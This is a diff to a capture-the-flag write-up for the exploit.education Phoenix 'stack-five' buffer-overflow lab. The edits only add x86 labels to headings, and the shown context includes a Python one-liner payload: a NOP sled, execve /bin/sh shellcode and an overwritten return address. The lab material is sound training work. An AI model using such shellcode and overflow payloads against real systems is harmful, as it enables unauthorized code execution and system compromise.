@@ -1,4 +1,4 @@
-# https://exploit.education/phoenix/stack-five/
+# https://exploit.education/phoenix/stack-five/ (x86)
 
 ### This challenge is relatively straightforward, you need to place a shell code into stack and make sure return address points to the beginning. 
 ### Nevertheless, when you encounter something similar for the first time, you can waste a lot of time on some of the following caveats:
@@ -50,7 +50,7 @@
 
 ```
 
-## Finally, The solution to the above exercise :
+## Finally, The solution to the above exercise (fox x86) :
 
 ```console
 python3 -c "import sys; sys.stdout.buffer.write (b'\x90' * 0x60 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80' + b'\x90' * 0x15 + b'\xd0\xd6\xff\xff')"
